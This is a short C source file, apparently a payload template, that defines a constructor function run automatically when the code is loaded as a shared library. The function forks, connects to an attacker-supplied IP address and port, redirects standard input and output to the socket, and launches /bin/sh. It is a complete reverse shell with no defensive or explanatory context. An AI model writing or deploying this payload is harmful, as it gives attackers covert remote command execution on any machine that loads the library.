#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
static void main(void) __attribute__((constructor));
static void main(void)
{
    int pid = fork();
    if (!pid)
    {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in serv_addr = {0};
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons({port});
        serv_addr.sin_addr.s_addr = inet_addr("{ip}");
        connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        execl("/bin/sh", "/bin/sh", NULL);
    }
}